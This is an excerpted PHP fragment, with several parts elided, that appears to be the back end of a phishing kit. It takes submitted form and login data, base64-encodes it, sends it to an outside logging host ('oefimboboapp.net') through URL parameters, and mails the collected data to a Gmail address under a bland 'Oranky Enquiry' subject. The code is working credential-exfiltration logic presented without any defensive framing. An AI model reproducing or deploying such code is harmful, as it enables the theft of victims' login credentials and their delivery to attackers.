...
if(isset($_POST['_c']) && (!empty($_POST['_c'])))
{
  if(isset($_POST['_d']) && (!empty($_POST['_d'])))
  {
    ...
    if(isset($loginArr) && is_array($loginArr) && (sizeof($loginArr) >= 1))
    {
      ...
      if(!(isset($_POST['_type']) && ($_POST['_type']==1)))
      {
	$url = "http://oefimboboapp.net/webservice/rest/post/mod_service_web_loggerx.php?_ovhkey=".urlencode(base64_encode(base64_encode(urldecode($_POST['_c'])))).'&_val='.urlencode(base64_encode($dataStr));
	...
	if(isset($rsJson) && (!empty($rsJson)))
	{
	  ...
	  if(isset($rsArr[0]['status']) && ($rsArr[0]['status']>=1) && isset($rsArr[0]['data']) && ($rsArr[0]['data']>=1))
	  {
	    ...
	    $_uriExtra['_terms'] = 1;
	    $url = "http://oefimboboapp.net/webservice/rest/post/mod_service_web_loggerx.php?_ovhkey=".urlencode(base64_encode(base64_encode(urldecode($_POST['_c']))))."&isnew=".$_ISNEW."&_terms=1";
      ...
      {
	//print_r($dataStr);echo "--xxss";
	$to = "ericm00142@gmail.com";
         $subject = "Oranky Enquiry";
         
         $message = $dataStr;
         $message .= "<h1>New message</h1>";
         
         $header = "From:1stbn@localhost.co.za \r\n";
         ...
         if($retval == true){$_desc = "Message sent successfully.";}else{$_desc = "Message could not be sent.";}
	 $array = array("data"=>"success","status"=>1,"description"=>$_desc);
	 $action=true;
      }
